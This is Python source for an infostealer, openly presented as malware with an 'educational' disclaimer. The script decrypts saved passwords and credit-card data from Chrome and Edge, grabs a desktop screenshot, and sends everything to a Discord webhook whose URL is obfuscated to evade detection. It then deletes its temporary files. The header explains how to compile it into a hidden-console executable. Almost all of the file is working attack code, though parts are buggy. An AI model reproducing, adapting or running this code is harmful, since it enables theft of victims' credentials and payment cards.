#[=========================================]#[=========================================]#
# chromium-based password/cc stealer > educational purposed                             #
# "awkward" undetectable webhook method > or so i hope it's "undetectable"              #
# utilizes discord's webhook capability to send victim's passwords in a .zip file       #
# authored by s4cial | github: s4cial                                                   #
# poorly made/not my best > cleaned up a little                                         #
#[=========================================]#[=========================================]#
# py > exe :                                                                            #
# pip install pyinstaller												                # 
# cd path/to/files/												                        #
# pyinstaller --clean --onefile --noconsole --i icon.ico browsersteal.py                #
#[=========================================]#[=========================================]#
# would love to see a better version of this, when making this > there previously 0 repo's with this concept
# decided to put the idea out there, hopefully someone alot more advanced than i can create something a little more functional
#[=========================================]#[=========================================]#

# DEPENDENCIES
import http.cookiejar as cookiejar
import ctypes.wintypes
import cryptography
import requests
import platform
import sqlite3
import zipfile
import base64
import shutil
import ctypes
import json
import os
import sys

# DEPENDENCIES
from cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.backends import default_backend
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
from urllib.parse import urlencode
from dhooks import Webhook, File
from Crypto.Cipher import AES
from json import loads, dumps
from datetime import datetime
from threading import Thread
from base64 import b64decode
from shutil import copyfile
from email import encoders
from PIL import ImageGrab
from re import findall
from time import sleep
from sys import argv

# EXAMPLE   : >                                      V "ID"     V "TOKEN"
# IMPORTANT : > REPLACE "ID" & "AUTH" | EX: webhooks/1233456789/hiddentoken
ht = "https:" 
slash = "/"
discord = "discord"
period = "."
id = "____"  # DISCORD WEBHOOK ID : > REPLACE THIS
auth = "___" # DISCORD WEBHOOK TOKEN : > REPLACE THIS
web = "web"
hoo = "hooks"

# DISCORD WEBHOOK 1 : > REPLACE WITH YOUR WEBHOOK ABOVE
hook = Webhook(f"{ht}{slash}{slash}{discord}{period}com{slash}api{slash}{web}{hoo}{slash}{id}{slash}{auth}")

# DISCORD WEBHOOK 2 : > REPLACE WITH YOUR WEBHOOK ABOVE
hooks = Webhook(f"{ht}{slash}{slash}{discord}{period}com{slash}api{slash}{web}{hoo}{slash}{id}{slash}{auth}")

# VARIABLES :
APP_DATA_PATH = os.environ['LOCALAPPDATA']
DB_PATH = r'Google\Chrome\User Data\Default\Login Data'
NONCE_BYTE_SIZE = 12

# MAIN
def exit():
    sys.exit(0)

def encrypt(cipher, plaintext, nonce):
    cipher.mode = modes.GCM(nonce)
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(plaintext)
    return (cipher, ciphertext, nonce)

def decrypt(cipher, ciphertext, nonce):
    cipher.mode = modes.GCM(nonce)
    decryptor = cipher.decryptor()
    return decryptor.update(ciphertext)

def get_cipher(key):
    cipher = Cipher(
        algorithms.AES(key),
        None,
        backend=default_backend()
    )
    return cipher

def decryptionDPAPI(encrypted):
    import ctypes
    import ctypes.wintypes

    class DATA_BLOB(ctypes.Structure):
        _fields_ = [('cbData', ctypes.wintypes.DWORD),
                    ('pbData', ctypes.POINTER(ctypes.c_char))]

    p = ctypes.create_string_buffer(encrypted, len(encrypted))
    blobin = DATA_BLOB(ctypes.sizeof(p), p)
    blobout = DATA_BLOB()
    retval = ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))
    if not retval:
        raise ctypes.WinError()
    result = ctypes.string_at(blobout.pbData, blobout.cbData)
    ctypes.windll.kernel32.LocalFree(blobout.pbData)
    return result

def localdata_key():
    jsn = None
    with open(os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data\Local State"), encoding='utf-8', mode="r") as f:
        jsn = json.loads(str(f.readline()))
    return jsn["os_crypt"]["encrypted_key"]

def aes_decrypt(encrypted_txt):
    encoded_key = localdata_key()
    encrypted_key = base64.b64decode(encoded_key.encode())
    encrypted_key = encrypted_key[5:]
    key = decryptionDPAPI(encrypted_key)
    nonce = encrypted_txt[3:15]
    cipher = get_cipher(key)
    return decrypt(cipher, encrypted_txt[15:], nonce)

# CHROME PASSWORD-STEAL :
class ChromePassword:
    def __init__(self):
        self.passwordList = []

    def get_chrome_db(self):
        _full_path = os.path.join(APP_DATA_PATH, DB_PATH)
        _temp_path = os.path.join(APP_DATA_PATH, 'sqlite_file')
        if os.path.exists(_temp_path):
            os.remove(_temp_path)
        shutil.copyfile(_full_path, _temp_path)
        self.show_password(_temp_path)

    def show_password(self, db_file):
        conn = sqlite3.connect(db_file)
        _sql = 'select signon_realm,username_value,password_value from logins'
        for row in conn.execute(_sql):
            host = row[0]
            if host.startswith('android'):
                continue
            name = row[1]
            value = self.chrome_decrypt(row[2])
            _info = 'HOSTNAME: %s\nUSER: %s\nPASSWORD: %s\n\n' % (
                host, name, value)
            self.passwordList.append(_info)
        conn.close()
        os.remove(db_file)

    def chrome_decrypt(self, encrypted_txt):
        if sys.platform == 'win32':
            try:
                if encrypted_txt[:4] == b'\x01\x00\x00\x00':
                    decrypted_txt = decryptionDPAPI(encrypted_txt)
                    return decrypted_txt.decode()
                elif encrypted_txt[:3] == b'v10':
                    decrypted_txt = aes_decrypt(encrypted_txt)
                    return decrypted_txt[:-16].decode()
            except WindowsError:
                return None
        else:
            pass

    def save_passwords(self):
        with open('C:\\ProgramData\\Passwords.txt', 'w', encoding='utf-8') as f:
            f.writelines(self.passwordList)

if __name__ == "__main__":
    Main = ChromePassword()
    try:
        Main.get_chrome_db()
    except:
        pass
    Main.save_passwords()

# DESKTOP SCREENSHOT :
screen = ImageGrab.grab()
screen.save(os.getenv('ProgramData') + r'\Screenshot.jpg')
screen = open(r'C:\ProgramData\Screenshot.jpg', 'rb')
screen.close()
screenshot = File(r'C:\ProgramData\Screenshot.jpg')

# DEFINE PASSWORDS > SEND TO A .ZIP :
zname = r'C:\ProgramData\Passwords.zip'
newzip = zipfile.ZipFile(zname, 'w')
newzip.write(r'C:\ProgramData\Passwords.txt')
newzip.write(r'C:\ProgramData\Screenshot.jpg')
newzip.close()
passwords = File(r'C:\ProgramData\Passwords.zip')

# SEND OUR FILES TO OUR WEBHOOK > REMOVE THEM AFTER :
hook.send("desktop :", file=screenshot)
hook.send("passwords :", file=passwords)
os.remove(r'C:\ProgramData\Passwords.txt')
os.remove(r'C:\ProgramData\Screenshot.jpg')
os.remove(r'C:\ProgramData\Passwords.zip')

# CHROME CREDIT-STEAL :
def get_master_key():
    try:
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State',
                  "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
    except:
        hook.send("chrome not installed > moving to next stage")
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = ctypes.windll.crypt32.CryptUnprotectData(
        (master_key, None, None, None, 0)[1])
    return master_key

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except:
        hook.send("decryption: error, chrome < 80")
        pass

def get_password():
    master_key = get_master_key()
    login_db = os.environ['USERPROFILE'] + os.sep + \
        r'AppData\Local\Google\Chrome\User Data\default\Login Data'
    try:
        shutil.copy2(login_db,"Loginvault.db")
    except:
        hook.send("chrome not installed > moving to the next stage")
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()

    try:
        cursor.execute(
            "SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password(
                encrypted_password, master_key)
            if username != "" or decrypted_password != "":
                hook.send(f"URL: " + url + "\nUSER: " + username + "\nPASSWORD: " + decrypted_password + "\n" + "*" * 10 + "\n")
    except:
        os.remove("Loginvault.db")
        pass

    cursor.close()
    conn.close()
    try:
        os.remove("Loginvault.db")
    except:
        pass

def get_credit_cards():
    master_key = get_master_key()
    login_db = os.environ['USERPROFILE'] + os.sep + \
        r'AppData\Local\Google\Chrome\User Data\default\Web Data'
    shutil.copy2(login_db,
                 "CCvault.db")
    conn = sqlite3.connect("CCvault.db")
    cursor = conn.cursor()

    try:
        cursor.execute("SELECT * FROM credit_cards")
        for r in cursor.fetchall():
            username = r[1]
            encrypted_password = r[4]
            decrypted_password = decrypt_password(
                encrypted_password, master_key)
            expire_mon = r[2]
            expire_year = r[3]
            hook.send(f"CARD-NAME: " + username + "\nNUMBER: " + decrypted_password + "\nEXPIRY M: " +
                      str(expire_mon) + "\nEXPIRY Y: " + str(expire_year) + "\n" + "*" * 10 + "\n")

    except:
        pass

    cursor.close()
    conn.close()
    try:
        os.remove("CCvault.db")
    except:
        pass

# M.E CREDT/PASSWORD-STEAL :
def get_password1():
    master_key = get_master_key()
    login_db = os.environ['USERPROFILE'] + os.sep + \
        r'AppData\Local\Microsoft\Edge\User Data\Profile 1\Login Data'
    try:
        shutil.copy2(login_db,
                     "Loginvault.db")
    except:
        hook.send("decryption: m.e data not found")
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()

    try:
        cursor.execute(
            "SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password(
                encrypted_password, master_key)
            if username != "" or decrypted_password != "":
                hooks.send(f"URL: " + url + "\nUSER: " + username +
                           "\nPASSWORD: " + decrypted_password + "\n" + "*" * 10 + "\n")
    except:
        pass

    cursor.close()
    conn.close()
    try:
        os.remove("Loginvault.db")
    except:
        pass

def get_credit_cards1():
    master_key = get_master_key()
    login_db = os.environ['USERPROFILE'] + os.sep + \
        r'AppData\Local\Microsoft\Edge\User Data\Profile 1\Login Data'
    try:
        shutil.copy2(login_db, "CCvault.db")
    except:
        conn = sqlite3.connect("Loginvault.db")
        cursor = conn.cursor()
        conn = sqlite3.connect("CCvault.db")
        cursor = conn.cursor()

    try:
        cursor.execute("SELECT * FROM credit_cards")
        for r in cursor.fetchall():
            username = r[1]
            encrypted_password = r[4]
            decrypted_password = decrypt_password(
                encrypted_password, master_key)
            expire_mon = r[2]
            expire_year = r[3]
            hooks.send(f"CARD-NAME: " + username + "\nNUMBER: " + decrypted_password + "\nEXPIRY M: " +
                       str(expire_mon) + "\nEXPIRY Y: " + str(expire_year) + "\n" + "*" * 10 + "\n")
    except:
        pass

    cursor.close()
    conn.close()
    try:
        os.remove("CCvault.db")
    except:
        pass


while True:
    get_password()
    get_password1()
    get_credit_cards()
    get_credit_cards1()
    os.remove(r"\CCvault.db")
    os.remove(r"\Loginvault.db")
    break
